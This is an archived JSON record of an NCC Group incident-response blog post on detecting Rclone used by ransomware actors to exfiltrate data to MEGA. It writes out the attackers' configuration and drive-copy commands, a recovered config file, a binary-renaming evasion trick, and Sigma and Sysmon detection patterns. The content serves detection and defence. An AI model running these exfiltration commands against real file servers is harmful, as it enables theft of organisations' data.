{
    "id": "c4bded2b-3d67-43c6-9265-1bd8a6afda7a",
    "created_at": "2023-01-12T15:04:36.180426Z",
    "updated_at": "2025-03-27T02:05:49.95257Z",
    "deleted_at": null,
    "sha1_hash": "286ab07bf52bc7ade98cc693c8e5e8a464581839",
    "title": "2020-05-27 - Detecting Rclone – An Effective Tool for Exfiltration",
    "authors": "",
    "file_creation_date": "2022-05-28T02:07:10Z",
    "file_modification_date": "2022-05-28T02:07:10Z",
    "file_size": 147786,
    "plain_text": "# Detecting Rclone – An Effective Tool for Exfiltration\n\n**[research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/](https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/)**\n\nMay 27, 2021\n\nNCC Group’s Cyber Incident Response Team (CIRT) have responded to a large number of\n[ransomware cases where frequently the open source tool Rclone being used for data](https://rclone.org/)\nexfiltration. Rclone provides an easy and effective way of copying data to an array of cloud\n[storage providers. This blog post builds on the work by others [1][2] and provides additional](https://redcanary.com/blog/rclone-mega-extortion/)\n[methods of detection, including Sigma rules to assist with hunting in your own environment.](https://github.com/SigmaHQ/sigma)\n\nFrequently Rclone is used with a MEGA.io account to stage the exfiltrated data before it is\nmade available on leak sites. In the case of Conti ransomware there are strong indications\nthat once the data has been uploaded to MEGA it is being copied to another location using\n[MEGAsync. More recently there has been a move away from solely using cloud storage](https://help.mega.nz/megasync/)\nproviders and instead VPS hosting is being used as a destination for data exfiltration.\n\n\n-----\n\nInternal file servers with unfiltered Internet access are common targets and frequently Rclone\nis left to run for a period of time spanning multiple hours, which provides the actor enough\ntime to exfiltrate a large volume of data. In all cases observed so far, data exfiltration has\ntaken place long before the ransomware is deployed, often days in advance.\n\nRclone requires a configuration to be created before it can connect to MEGA (or other cloud\nstorage provider) which can be done in one of two ways:\n\nOn the command line:\n```\n.\\rclone.exe config create remote mega user [redacted]@outlook.com pass [redacted]\n\n```\nThe table below breaks down the command line profile creation.\n\nconfig Initiates the configuration file being created\n\ncreate Creation of configuration file\n\nremote Name given to the remote profile being created (name can vary)\n\nmega Cloud storage provider\n\nuser Username for the MEGA.io account\n\npass Password for the MEGA.io account [obscured](https://rclone.org/commands/rclone_obscure/)\n\nConfig Command Breakdown\nAlternatively the inbuilt configuration guide can be used which walks through the process\noffering different options:\n```\n.\\rclone.exe config\n\n```\nOnce the profile has been created the following configuration file is created:\n```\nC:\\Users\\<username>\\.config\\rclone\\rclone.conf\n\n```\nIn a recent incident response engagement, NCC CIRT were able to recover a configuration\nfile from this location which looked like the following:\n```\n[remote]\ntype = mega\nuser = [redacted]@outlook.com\npass = [redacted]\n\n```\nOnce the configuration has been made it is possible to connect to MEGA and exfiltrate the\ndata. In examples observed by NCC Group CIRT, actors have accessed file servers,\nbrowsed shared drives and then pointed Rclone at the drives like the example below.\n```\n.\\rclone.exe copy E:\\ remote:data\n\n```\n\n-----\n\ncopy Command for copying data\n\nE:\\ Drive or folder which data is to be copied from\n\nremote Specifies the remote profile created in the configuration stage\n\ndata Folder on MEGA where the data is copied to\n\nCopy Command Breakdown\nOnce the data is being copied there is outbound traffic to subdomains of\n```\nuserstorage.mega.co[.]nz such as gfs270n071.userstorage.mega.co[.]nz . The\n\n```\ndomains typically resolve to IP addresses associate with the MEGA ASN 205809 but not in\nall cases. Where MEGA is not used, there is typically a large volume of outbound traffic to a\nsingle IP address which can be seen as a spike in any network monitoring.\n\nIn some cases actors have been observed changing the executable name to avoid detection.\nA recent case found the actor had renamed the Rclone binary to `svchost.exe and placed`\nit in the directory `C:\\Windows\\ .`\n\n**Sigma Rules**\n\nThe following Sigma rules has been created to aid in the detection of Rclone.\n\n\nRclone Execution via\nCommand Line or\nPowerShell\n\n\nThis rule detects the execution of Rclone.\n\n\nRclone config file\ncreation This Sigma rule will detect the creation of the Rclone configuration\nfile. The Sysmon configuration must include the following for the\nFileCreate rule group.\n```\n            <TargetFilename name=\"rclone\"\n            condition=\"contains\">\\rclone\\</TargetFilename>\n\n```\n\nDNS Query for\nMEGA.io Upload\nDomain\n\nSigma Rule Breakdown\n\n\nThis final rule will detect DNS queries for subdomains of\n```\nuserstorage.mega.co[.]nz.\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-27 - Detecting Rclone – An Effective Tool for Exfiltration.pdf"
    ],
    "report_names": [
        "2020-05-27 - Detecting Rclone – An Effective Tool for Exfiltration.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535876,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1653703630,
    "ts_modification_date": 1653703630,
    "files": {
        "pdf": "https://archive.orkl.eu/286ab07bf52bc7ade98cc693c8e5e8a464581839.pdf",
        "text": "https://archive.orkl.eu/286ab07bf52bc7ade98cc693c8e5e8a464581839.txt",
        "img": "https://archive.orkl.eu/286ab07bf52bc7ade98cc693c8e5e8a464581839.jpg"
    }
}